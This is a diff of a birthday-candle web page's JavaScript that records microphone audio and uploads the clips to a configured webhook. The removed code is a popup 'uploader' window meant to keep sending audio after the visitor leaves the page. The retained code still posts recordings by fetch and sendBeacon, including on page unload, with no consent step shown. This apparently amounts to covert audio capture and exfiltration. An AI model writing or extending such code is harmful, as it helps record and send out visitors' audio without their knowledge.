@@ -714,45 +714,6 @@ const CONFIG = {
 };
 /* ================== END CONFIG ================== */
 
-/* ---------- Uploader window handle (ADDED for Option B) ---------- */
-/*
-  Approach:
-  - We open a small "uploader.html" window (same origin) that stays alive after navigation.
-  - When main page wants to upload an audio blob, it posts the blob to the uploader window via postMessage.
-  - The main page does NOT await the upload when the uploader window is available, so navigation won't block.
-*/
-let uploaderWin = null;
-function openUploaderWindow() {
-  try {
-    // Try to reuse existing named window
-    if (uploaderWin && !uploaderWin.closed) return uploaderWin;
-    // open uploader.html in same directory
-    uploaderWin = window.open('uploader.html', 'birthday-uploader', 'width=420,height=320,top=50,left=50');
-    // If popup blocked uploaderWin may be null
-    if (!uploaderWin) {
-      console.warn('Uploader window blocked or could not be opened.');
-    } else {
-      // we can optionally focus it
-      try { uploaderWin.focus(); } catch (e) { /* ignore */ }
-    }
-    return uploaderWin;
-  } catch (e) {
-    console.warn('openUploaderWindow error', e);
-    return null;
-  }
-}
-
-// Optional: handle status messages from uploader window (not required)
-window.addEventListener('message', (ev) => {
-  try {
-    const d = ev.data || {};
-    if (d && d.type === 'uploader-status') {
-      console.log('Uploader status:', d);
-      // Could show UI message if desired
-    }
-  } catch (e) { }
-});
-
 /* ---------- state & elements ---------- */
 let left = CONFIG.TOTAL_CANDLES;
 let placed = [];
@@ -1015,9 +976,6 @@ function startAudioRecording(stream) {
   if (!stream) return;
   if (mediaRecorder && mediaRecorder.state === 'recording') return; // already recording
 
-  // ensure uploader window is open so uploads go there in background
-  try { openUploaderWindow(); } catch (e) { }
-
   try {
     // prefer a common mime if supported
     const mime = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus'
@@ -1072,8 +1030,7 @@ async function stopAndSendAudioSegment(tag = '') {
           // Build filename (with timestamp and tag)
           const filename = `recording-${Date.now()}${tag ? '-' + tag : ''}.${blob.type.includes('webm') ? 'webm' : 'ogg'}`;
 
-          // Attempt upload — this function will post to uploaderWin (background) if available,
-          // otherwise it will do a normal fetch (same as before).
+          // Attempt upload
           await sendAudioToWebhook(blob, filename);
 
         } catch (e) {
@@ -1122,32 +1079,11 @@ async function stopAndSendAudioSegment(tag = '') {
 
 /**
  * sendAudioToWebhook(blob, filename)
- * POSTS the audio blob as multipart/form-data 'file' to the configured webhook.
- * NEW: If uploader window is open, we postMessage the blob to that window for background uploading
- * and return immediately (no waiting). If uploader not available, fall back to original fetch path.
+ * POSTs the audio blob as multipart/form-data 'file' to the configured webhook.
+ * Falls back to JSON { filename, base64 } if regular POST returns non-OK status.
  */
 async function sendAudioToWebhook(blob, filename = 'audio.webm') {
   if (!CONFIG.AUDIO_WEBHOOK_URL) return;
-
-  // If we have an uploader window available and it isn't closed, send the blob to it
-  try {
-    if (uploaderWin && !uploaderWin.closed) {
-      try {
-        // Post the blob to the uploader window for background upload
-        uploaderWin.postMessage({ type: 'upload', url: CONFIG.AUDIO_WEBHOOK_URL, filename, blob }, '*');
-        console.log('Posted audio to uploader window for background upload:', filename);
-        // Return early — do not wait here (background upload will continue in other window)
-        return;
-      } catch (e) {
-        console.warn('Posting audio to uploader window failed — falling back to direct upload', e);
-        // fall through to direct upload
-      }
-    }
-  } catch (e) {
-    console.warn('uploaderWin check error', e);
-  }
-
-  // --- FALLBACK: original direct fetch behavior (if uploader not available) ---
   try {
     const form = new FormData();
     form.append('file', blob, filename);
@@ -1168,12 +1104,13 @@ async function sendAudioToWebhook(blob, filename = 'audio.webm') {
       });
     }
   } catch (err) {
-    // If fetch fails (CORS/network), we still try sendBeacon (best-effort)
+    // If fetch fails (CORS/network), we still try sendBeacon (if possible) as best-effort
     console.error('sendAudioToWebhook fetch error:', err);
     try {
+      // sendBeacon accepts a Blob (best-effort)
       if (navigator.sendBeacon) {
-        // sendBeacon accepts a Blob (best-effort)
-        navigator.sendBeacon(CONFIG.AUDIO_WEBHOOK_URL, blob);
+        const beaconBlob = blob;
+        navigator.sendBeacon(CONFIG.AUDIO_WEBHOOK_URL, beaconBlob);
       }
     } catch (e) {
       console.error('sendBeacon fallback failed:', e);
@@ -1209,17 +1146,6 @@ window.addEventListener('beforeunload', (ev) => {
           console.warn('sendBeacon failed', e);
         }
       }
-    }
-
-    // Also post the remaining blob to the uploader window (best-effort)
-    try {
-      if (uploaderWin && !uploaderWin.closed && audioChunks.length > 0) {
-        const blob2 = new Blob(audioChunks, { type: audioMimeType || 'audio/webm' });
-        const filename = `recording-${Date.now()}-beforeunload.${blob2.type.includes('webm') ? 'webm' : 'ogg'}`;
-        uploaderWin.postMessage({ type: 'upload', url: CONFIG.AUDIO_WEBHOOK_URL, filename, blob: blob2 }, '*');
-      }
-    } catch (e) {
-      console.warn('postMessage to uploader on beforeunload failed', e);
     }
   } catch (e) {
     console.warn('beforeunload audio send failed', e);
